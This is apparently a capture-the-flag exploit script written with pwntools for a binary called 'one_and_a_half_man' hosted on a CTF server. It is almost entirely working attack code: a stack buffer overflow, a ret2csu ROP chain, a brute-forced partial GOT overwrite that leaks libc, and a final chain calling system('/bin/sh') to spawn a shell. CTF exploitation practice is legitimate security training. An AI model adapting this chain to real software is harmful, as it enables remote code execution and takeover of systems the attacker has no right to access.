from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

TARGET = './one_and_a_half_man'
HOST = 'one-and-a-half-man.3k.ctf.to'
PORT = 8521 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
'''
  400670:       4c 89 fa                mov    rdx,r15
  400673:       4c 89 f6                mov    rsi,r14
  400676:       44 89 ef                mov    edi,r13d
  400679:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  40067d:       48 83 c3 01             add    rbx,0x1
  400681:       48 39 dd                cmp    rbp,rbx
  400684:       75 ea                   jne    400670 <__libc_csu_init+0x40>
  400686:       48 83 c4 08             add    rsp,0x8
  40068a:       5b                      pop    rbx
  40068b:       5d                      pop    rbp
  40068c:       41 5c                   pop    r12
  40068e:       41 5d                   pop    r13
  400690:       41 5e                   pop    r14
  400692:       41 5f                   pop    r15
  400694:       c3                      ret
'''
csu_load = 0x40068a
csu_exec = 0x400670
rdi = 0x00400693

while(1):
    r = start()

    payload = 'A'*18
    payload += flat(csu_load, 0, 1, elf.got.read, 0, elf.got.setvbuf, 2, csu_exec)
    payload += flat(1, 2, 3, 4, 5, 6, 7, elf.sym.main)
    payload = payload.ljust(0xaa, 'A')
    r.send(payload)
    r.send('\x30\x1a') # 1/16
    if args.R:
        r.recvuntil('\n')
        ret = r.recvuntil('\n')
        log.info(ret)
        if '\xad\xfb' in ret :
            break
        r.close()
    else:
        try:
            r.recv(5)
            r.recv(5)
            break
        except:
            r.close()

if args.D:
    debug(r, [0x5dc])
payload = 'A'*18
payload += flat(csu_load, 0, 1, elf.got.setvbuf, elf.got.read, 0, 0, csu_exec)
payload += flat(11, 12, 13, 14, 15, 16, 17, elf.sym.main)
r.send(payload)
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
dbg('leak')
base = leak -0x110180
dbg('base')
system = base + 0x4f4e0
binsh = base + 0x1b40fa
payload = 'A'*18
payload += flat(rdi, binsh, rdi+1, system)
r.send(payload)



r.interactive()
r.close()
